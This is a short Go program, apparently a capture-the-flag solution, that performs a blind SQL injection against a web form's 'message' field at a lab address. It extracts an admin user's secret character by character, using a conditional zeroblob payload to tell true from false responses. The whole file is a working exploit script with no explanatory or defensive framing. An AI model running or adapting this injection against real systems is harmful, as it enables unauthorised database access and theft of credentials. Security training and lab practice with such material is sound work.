package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strconv"
)

var sc string
var User_Secret string

func brute(p int) string {
	characters := `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!*+,-.=`

	for _, c := range characters {
		sc := ""
		payload1 := "(SELECT substr(secret,"+ strconv.Itoa(p) +",1) FROM users where username='admin' LIMIT 1)='" + string(c) +"'"
		payload := "'),((SELECT CASE WHEN " + payload1 + " THEN 1 ELSE zeroblob(1000000000) END))--"
		client := &http.Client{}
		form := url.Values{}
		form.Add ("message", payload)
		req, err := http.NewRequest("POST", "http://10.10.10.195/submitmessage", bytes.NewBufferString(form.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded;")
		//fmt.Println(req.Body)
		resp, err := client.Do(req)
		data, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Printf("error = %s \n", err)
		}
		if string(data) == "OK" {
			//sc := ""
			sc = string(c)
			_ = sc
			return sc
		}
		//fmt.Println("Character: " + string(c))
		//fmt.Printf("Response = %s \n", string(data))
		//resp.Body.Close()
	}
		return sc
}

func main() {
	for i := 1; i <=64; i++ {
		secret := brute(i)
		User_Secret += secret
		fmt.Printf("\r[+] Admin Secret: %s", User_Secret)
	}
}

